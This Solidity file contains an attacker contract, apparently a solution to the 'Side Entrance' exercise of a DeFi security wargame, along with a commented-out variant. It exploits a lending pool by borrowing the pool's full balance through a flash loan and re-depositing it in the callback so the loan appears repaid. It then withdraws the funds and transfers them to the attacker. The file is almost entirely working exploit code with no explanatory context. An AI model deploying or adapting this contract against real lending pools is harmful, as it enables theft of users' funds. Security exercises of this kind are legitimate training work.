pragma solidity ^0.6.0;

//import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external ;
}
contract SideEntranceAttacker {

    ISideEntranceLenderPool mainLenderPool;
    address payable public attackerAddress;
    constructor() public{
        attackerAddress = msg.sender;
    }

    function  stealFunds(ISideEntranceLenderPool _mainPoolAddress) external{
        mainLenderPool = _mainPoolAddress;
        address mainPool = address(_mainPoolAddress);
        uint256 totalPoolBalance = address(mainPool).balance;
        bytes memory flashLoanPayload = abi.encodeWithSignature("flashLoan(uint256)",totalPoolBalance);
        bytes memory withdrawPayload = abi.encodeWithSignature("withdraw()");
       
        (bool success, ) = mainPool.call(flashLoanPayload);
        require (success,"FlashLoan transaction Failed");
        (bool done, ) = mainPool.call(withdrawPayload);
        require (done,"withdraw transaction Failed");

        attackerAddress.transfer(totalPoolBalance);

    }
    
    function execute() external payable{
        mainLenderPool.deposit{value: msg.value}();
    }

    receive() external payable{}
}
 

// contract SideEntranceAttacker {
//     using Address for address payable;

//     ISideEntranceLenderPool mainPool;

//     function  stealFunds(ISideEntranceLenderPool _mainPoolAddress) external{
//         mainPool = _mainPoolAddress;
//         mainPool.flashLoan(address(mainPool).balance);
//         mainPool.withdraw();
//         msg.sender.sendValue(address(this).balance);

//     }
    
//     function execute() external payable{
//         mainPool.deposit{value:msg.value}();
//     }

//     receive() external payable{}
// }
//  
